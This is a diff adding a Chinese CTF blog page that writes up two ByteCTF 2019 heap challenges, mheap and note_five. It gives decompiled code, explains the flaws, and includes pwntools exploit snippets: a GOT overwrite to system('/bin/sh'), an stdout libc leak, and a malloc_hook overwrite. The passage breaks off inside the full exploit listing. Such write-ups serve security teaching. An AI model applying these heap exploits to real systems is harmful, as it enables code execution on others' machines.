@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,CTF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近一直忙着项目，都没有时间做题了，还有就是研二开学感觉突然压力就大了，没有耐心做题了。">
+<meta name="keywords" content="pwn,CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ByteCTF 2019 pwn">
+<meta property="og:url" content="http://x3h1n.github.io/2019/10/02/ByteCTF-2019-pwn/index.html">
+<meta property="og:site_name" content="X3h1n">
+<meta property="og:description" content="最近一直忙着项目，都没有时间做题了，还有就是研二开学感觉突然压力就大了，没有耐心做题了。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-10-04T14:34:58.727Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ByteCTF 2019 pwn">
+<meta name="twitter:description" content="最近一直忙着项目，都没有时间做题了，还有就是研二开学感觉突然压力就大了，没有耐心做题了。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","3display":"post","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://x3h1n.github.io/2019/10/02/ByteCTF-2019-pwn/"/>
+
+
+
+
+
+  <title>ByteCTF 2019 pwn | X3h1n</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">X3h1n</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://x3h1n.github.io/2019/10/02/ByteCTF-2019-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="X3h1n">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ByteCTF 2019 pwn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-02T16:10:18+08:00">
+                2019-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近一直忙着项目，都没有时间做题了，还有就是研二开学感觉突然压力就大了，没有耐心做题了。<br><a id="more"></a></p>
+<h1 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目没有PIE，got表可写。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ubuntu/Documents/2019/bytectf/mheap/mheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>
+<p>首先题目mmap了一段内存，大小为0x1000，起始地址为0x23330000，然后在这段内存上实现了我们常见的add、free、show和edit。在整个过程中，有几个比较重要的全局变量，首先是全局的heap_list，记录每个chunk分配的地址。有一个freed_size，在初始时被设为0x1000，只要add它就会减去相应的大小。alloc_start是add的起始地址，就是空闲内存的起始地址。new_freed会记录最新释放的chunk的大小，然后以单链表的形式连接，在每次add时会先去整个空闲链表中去寻找有没有合适大小的chunk，如果有的话会直接返回，如果没有的话就会在alloc_start为起始地址进行切割。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000004040C0 freed_size      dq ?                    ; DATA XREF: sub_40122D+8A↑w</span><br><span class="line">.bss:00000000004040C0                                         ; sub_40138A:loc_4013E5↑r ...</span><br><span class="line">.bss:00000000004040C8 alloc_start     dq ?                    ; DATA XREF: sub_40122D+83↑w</span><br><span class="line">.bss:00000000004040C8                                         ; sub_40138A:loc_4013F8↑r ...</span><br><span class="line">.bss:00000000004040D0 new_freed       dq ?                    ; DATA XREF: sub_40122D+95↑w</span><br><span class="line">.bss:00000000004040D0                                         ; get_freed_chunk+7↑r ...</span><br><span class="line">.bss:00000000004040D8                 align 20h</span><br><span class="line">.bss:00000000004040E0 ; _QWORD heap_list[16]</span><br><span class="line">.bss:00000000004040E0 heap_list       dq 10h dup(?)           ; DATA XREF: free+1C↑o</span><br><span class="line">.bss:00000000004040E0                                         ; free+37↑o ...</span><br></pre></td></tr></table></figure></p>
+<p>在add函数中，程序接受size和content的输入，在输入size后，有一个函数处理，会检查是否能被0x10整除，然后向后进行0x10的对齐，就像在64位环境下堆的分配那样。得到对其后的final_size后，get_freed_chunk函数会先检查空闲链表有没有与final_size大小一致的chunk，如果有会直接返回其地址，也就是v5，如果没有的话会先进行freed_size的检查，因为题目限制最多累计分配0x1000大小的内存，通过检查后会从alloc_start进行分配，同时更新freed_size和alloc_start。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__<span class="function">fastcall <span class="title">sub_40138A</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v2; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> final_size; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( size &amp; <span class="number">0xF</span> )                             <span class="comment">// 判断能否被0x10整除</span></span><br><span class="line">    v3 = size + <span class="number">16</span> - (size &amp; <span class="number">0xF</span>);              <span class="comment">// size向后对齐0x10</span></span><br><span class="line">  final_size = v3 + <span class="number">0x10</span>;</span><br><span class="line">  v5 = get_freed_chunk(final_size);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )  <span class="comment">//找到对应大小的空闲chunk</span></span><br><span class="line">    <span class="keyword">return</span> v5 + <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( freed_size &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  v2 = (_QWORD *)alloc_start;</span><br><span class="line">  alloc_start += final_size;</span><br><span class="line">  freed_size -= final_size;</span><br><span class="line">  *v2 = final_size;</span><br><span class="line">  <span class="keyword">return</span> v2 + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在free功能中，会将上一个freed chunk保存在其chunk的起始地址偏移0x8处，起始地址处会保存size，然后更新new_freed，这样类似于fastbin一样就串起来了。最后清空全局的heap_list对应位置。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">free</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = heap_list[a1];</span><br><span class="line">    <span class="keyword">if</span> ( v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40144C(heap_list[a1]);</span><br><span class="line">      heap_list[a1] = <span class="number">0L</span>L;</span><br><span class="line">      LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_40144C</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)(a1 - <span class="number">16</span> + <span class="number">8</span>) = new_freed;         <span class="comment">// fd为前一个释放的chunk</span></span><br><span class="line">  result = a1 - <span class="number">16</span>;</span><br><span class="line">  new_freed = a1 - <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>edit没有什么特殊的，限制只能edit的字节数为0x10。show功能调用puts函数进行输出。</p>
+<h2 id="题目漏洞"><a href="#题目漏洞" class="headerlink" title="题目漏洞"></a>题目漏洞</h2><p>当时比赛时这是第一题，一直没找到漏洞在哪，而且我发现我当时漏看了一个地方，就是如果找到合适的空闲chunk会直接返回，我之前一直被整个freed_size限制了思路，一直考虑超过0x1000就不能再进行add了。但是只要分配之前free的大小的chunk是没有问题的。<br>题目的漏洞在add功能里面，在进行size的对齐后得到final_size，但是没有再进行检查，而是先去寻找有没有合适的chunk，再去检查freed_size的限制和更新freed_size。这样如果上次的freed_size不为0，假如是0x10，我们申请了一个0x80大小的chunk也是可以通过检查的，问题就出现在这里，如果alloc_start的起始地址是0x23330ff0，我们就可以申请到0x23331000以后的内存，但是0x23331000之后的内存是非法的，不可写，当我们输入content的时候调用my_read函数，当写0x23331000之后的内存时因为不可写，所以read函数会返回-1，那么v4=-1，buf的下标i就会变小，这样就可以写到前面一个chunk的内容，如果上一个chunk是一个freed chunk，可以去修改其fd指针，然后就是类似于fastbin attack的常规操作了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 buf, <span class="keyword">signed</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = read(<span class="number">0</span>, (<span class="keyword">void</span> *)(buf + i), size - i);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    i += v4;</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> __int8 *)(i - <span class="number">1L</span>L + buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)result != <span class="number">10</span> );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里其实还有一个问题，因为read函数返回值是-1，这样result就会被赋值为前一个chunk的数据，因为result相当于是目前数据指针的前一个字节，如果前面chunk的数据里有’\n’，循环就会停止了，这样就不能再继续向前覆盖了，所以后面exp里idx1的content长度与其size是一样的，全部填充，为了避免换行符。开始我是随便填充的“bbbb\n”，就发现会被截断，就没法再往前覆盖了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>找到漏洞了利用起来比较简单，首先分配两个chunk，然后释放idx1，然后分配到非法内存处，修改idx1的fd为0x4040d0，整个地址是new_freed的地址处，它的内容是idx1的起始地址，这里是0x23330fd0。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xfc0</span>,<span class="string">"aaaa\n"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">"b"</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,p64(<span class="number">0x4040d0</span>)+<span class="string">"c"</span>*(<span class="number">0x20</span><span class="number">-1</span>)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>然后再进行add，size的大小就是0x23330fd0-0x10，这样就可以绕过add中freed_size的检查，因为现在freed_size已经是负数了。从空闲链表中取出起始地址为0x4040d0的chunk，并在0x4040e0处写入atoi函数的got表地址，该处是heap_list[0]的位置，再进行show就可以泄露atoi函数地址从而得到libc的基址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">3</span>,<span class="number">0x23330fd0</span><span class="number">-0x10</span>,p64(elf.got[<span class="string">"atoi"</span>])+<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">"atoi"</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br></pre></td></tr></table></figure></p>
+<p>最后edit idx0将atoi函数地址修改为system函数地址，再下一次进行choice时输入“/bin/sh\x00”从而触发atoi(“/bins/sh\x00”)，也就是system(“/bin/sh\x00”)。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##atoi-&gt;system</span></span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice: "</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>完整的exp可以看这位大佬的<a href="https://bbs.pediy.com/thread-254367.htm" target="_blank" rel="noopener">帖子</a></p>
+<h1 id="note-five"><a href="#note-five" class="headerlink" title="note_five"></a>note_five</h1><h2 id="题目描述-amp-题目漏洞"><a href="#题目描述-amp-题目漏洞" class="headerlink" title="题目描述 &amp; 题目漏洞"></a>题目描述 &amp; 题目漏洞</h2><p>菜单题目，有三个功能，add、delete和edit，没有show，限制只能申请5个chunk，说是五个，其实可以重复申请，根据索引号可以覆盖前一个。题目限制了可申请堆块的大小为0x90至0x400。read函数里有一个off by one的漏洞。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">my_read</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> size, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; size )                             <span class="comment">// off by one</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"read error"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = buf;</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>关于利用思路，肯定需要利用off by one和chunk overlapping来修改stdout，从而泄露libc。因为题目限制堆块的大小最小为0x90，可以利用unsortedbin attack修改global_max_fast，整个变量限制了fastbin的最大的size。改为一个较大的数后，再利用fastbin attack来修改stdout。后续的利用思路看了网上的writeup有两个，第一个是传统的再次利用fastbin attack来修改malloc_hook，因为不能申请0x70的chunk，所以可以在malloc_hook附近先找一个0xff的fake chunk，然后在malloc_hook较近处写一个0x71，再第二次fastbin attack来申请到malloc_hook附近的chunk，然后修改malloc_hook为one_gadget。但是one_gadget都没能成功，所以可以修改malloc_hook为realloc，然后修改realloc_hook为one_gadget，尝试了之后最终可以将malloc_hook修改为realloc+13，来满足one_gadget的参数要求。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>第一个解法是修改malloc_hook的解法。<br>首先利用off by one来构造重叠的chunk，这里在进行unsortedbin attack时利用重叠的chunk将unsortedbin中空闲的chunk大小修改为0xf0，然后全部申请出来，不然只申请一部分在解链的时候会报错。0xf0也是后面为了凑stdout附近有一个0xff，可以构造fake chunk。先修改bk为global_max_fast-0x10。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0xa0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xa8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0xa0</span>+p64(<span class="number">0x160</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'\x00'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+<span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x37f8</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>)</span><br></pre></td></tr></table></figure></p>
+<p>之后释放的idx 2就可以进入到fastbin atack中，然后利用重叠的idx 1来修改idx 2的fd到stdout附近。从而泄露libc。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">##leak libc</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p16(<span class="number">0x25cf</span>)+<span class="string">'\n'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">0x41</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line">p.recvn(<span class="number">0x40</span>)</span><br><span class="line">leak_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak_addr - libc.symbols[<span class="string">"_IO_2_1_stderr_"</span>] - <span class="number">192</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak_addr:"</span>,hex(leak_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base:"</span>,hex(libc_base)</span><br></pre></td></tr></table></figure></p>
+<p>后面就是多次利用这个0xf0的chunk和重叠的idx 1来进行两次fastbin attack，从而申请到malloc_hook附近，再修改malloc_hook为realloc+13，realloc_hook为one_gadget。<br>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 